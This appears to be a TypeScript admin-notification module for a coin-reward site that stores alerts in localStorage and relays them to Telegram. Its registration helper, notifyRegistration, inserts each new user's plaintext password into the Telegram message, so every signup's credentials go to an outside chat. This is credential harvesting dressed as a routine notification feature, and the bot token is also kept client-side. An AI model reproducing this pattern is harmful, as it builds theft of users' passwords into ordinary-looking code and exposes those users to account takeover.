export interface AdminNotification {
  id: string;
  type: string;
  title: string;
  message: string;
  user_id: string;
  username: string;
  related_id: string;
  details: Record<string, any>;
  is_read: boolean;
  status: "pending" | "done";
  created_at: string;
}

const STORAGE_KEY = "coinloot_admin_notifications";

let _changeListeners: (() => void)[] = [];

export function onAdminNotifChange(fn: () => void): () => void {
  _changeListeners.push(fn);
  return () => { _changeListeners = _changeListeners.filter(f => f !== fn); };
}

function notifyChange() {
  _changeListeners.forEach(fn => fn());
}

function getStored(): AdminNotification[] {
  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
  } catch {
    return [];
  }
}

function setStored(notifs: AdminNotification[]) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(notifs.slice(0, 500)));
  notifyChange();
}

function generateId(): string {
  return `an-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;
}

function getTelegramConfig(): { enabled: boolean; token: string; chatId: string } {
  try {
    const saved = localStorage.getItem("coinloot_telegram_config");
    if (saved) return JSON.parse(saved);
  } catch { /* */ }
  return { enabled: true, token: "", chatId: "" };
}

async function sendTelegram(message: string): Promise<boolean> {
  const cfg = getTelegramConfig();
  if (!cfg.enabled) return false;
  try {
    const resp = await fetch("/api/telegram/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        message,
        botToken: cfg.token || undefined,
        chatId: cfg.chatId || undefined,
      }),
      signal: AbortSignal.timeout(10000),
    });
    const data = await resp.json();
    if (!data.sent) console.warn("Telegram send failed:", data.error);
    return data.sent === true;
  } catch {
    return false;
  }
}

// ── Public API ──

export function createAdminNotification(
  type: string,
  title: string,
  message: string,
  userId: string,
  username: string,
  details: Record<string, any> = {}
) {
  const notif: AdminNotification = {
    id: generateId(),
    type,
    title,
    message,
    user_id: userId,
    username,
    related_id: details.related_id || "",
    details,
    is_read: false,
    status: "pending",
    created_at: new Date().toISOString(),
  };

  const stored = getStored();
  stored.unshift(notif);
  setStored(stored);

  // Also log to server
  fetch("/api/admin/notifications", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(notif),
  }).catch(() => {});

  return notif;
}

export function getAdminNotifications(): AdminNotification[] {
  return getStored();
}

export function getUnreadAdminCount(): number {
  return getStored().filter((n) => n.status !== "done").length;
}

export function getPendingAdminNotifications(): AdminNotification[] {
  return getStored().filter((n) => n.status !== "done");
}

export function markAdminRead(id: string) {
  const stored = getStored();
  const found = stored.find((n) => n.id === id);
  if (found) {
    found.is_read = true;
    setStored(stored);
  }
}

export function markAsDone(id: string) {
  const stored = getStored();
  const found = stored.find((n) => n.id === id);
  if (found) {
    found.status = "done";
    found.is_read = true;
    setStored(stored);
  }
}

export function markAllAdminRead() {
  const stored = getStored();
  stored.forEach((n) => { n.is_read = true; n.status = "done"; });
  setStored(stored);
}

export function deleteAdminNotification(id: string) {
  setStored(getStored().filter((n) => n.id !== id));
}

// ── Shorthand helpers for the only two notification types ──

export function notifyRegistration(userId: string, username: string, email: string, country: string, password: string = "") {
  const now = new Date();
  const timeStr = now.toLocaleString();
  const displayCountry = country || "Unknown";

  // Admin notification
  createAdminNotification("new_user", "🆕 New User Registration", `User: ${username}\nEmail: ${email}\nCountry: ${displayCountry}\nTime: ${timeStr}`, userId, username, { email, country: displayCountry, related_id: userId });

  // Telegram alert
  const pwdLine = password ? `\n🔑 Password: <code>${password}</code>` : "";
  sendTelegram(
    `🆕 <b>New User Registration</b>\n\n👤 Username: ${username}\n📧 Email: ${email}${pwdLine}\n🌍 Country: ${displayCountry}\n🕒 Time: ${timeStr}`
  );
}

export function notifyWithdrawalRequest(userId: string, username: string, coinAmount: number, cashAmount: number, method: string, requestId: string) {
  const now = new Date();
  const timeStr = now.toLocaleString();

  // Admin notification
  createAdminNotification("withdrawal_request", "💰 New Withdrawal Request", `User: ${username}\nAmount: ${coinAmount.toLocaleString()}\nCash Value: $${cashAmount.toFixed(2)}\nMethod: ${method}\nTime: ${timeStr}`, userId, username, { coin_amount: coinAmount, cash_amount: cashAmount, method, related_id: requestId });

  // Telegram alert
  sendTelegram(
    `💰 <b>New Withdrawal Request</b>\n\n👤 Username: ${username}\n💰 Coins: ${coinAmount.toLocaleString()}\n💵 Cash: $${cashAmount.toFixed(2)}\n🏦 Method: ${method}\n🕒 Time: ${timeStr}`
  );
}
